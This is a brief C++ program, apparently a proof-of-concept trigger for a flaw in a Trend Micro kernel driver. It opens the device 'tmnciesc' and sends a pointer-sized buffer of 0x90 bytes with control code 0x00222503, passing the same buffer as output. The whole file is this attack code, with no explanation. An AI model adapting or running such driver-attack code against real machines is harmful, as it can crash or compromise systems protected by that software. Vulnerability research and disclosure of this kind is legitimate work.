// tmicro1.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>


int _tmain(int argc, _TCHAR* argv[])
{
	DWORD bytesReturned = 0;
	PVOID inbuff = NULL;
	int status;
	HANDLE hDevice = CreateFileA("\\\\.\\tmnciesc", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING,	0, NULL); 
	if (hDevice == (HANDLE)-1)
	{
	  printf("Device couldn't be opened... \n");
	  exit(-1);
	}

	inbuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PVOID));
	memset(inbuff, 0x90, sizeof(PVOID));

	status = DeviceIoControl(hDevice, 0x00222503, inbuff, sizeof(PVOID), inbuff, sizeof(PVOID), &bytesReturned, NULL);
	printf("DeviceIOControl Status: %llx\n", status);

	HeapFree(GetProcessHeap(), 0, inbuff);
	CloseHandle(hDevice);	
	return 0;
}

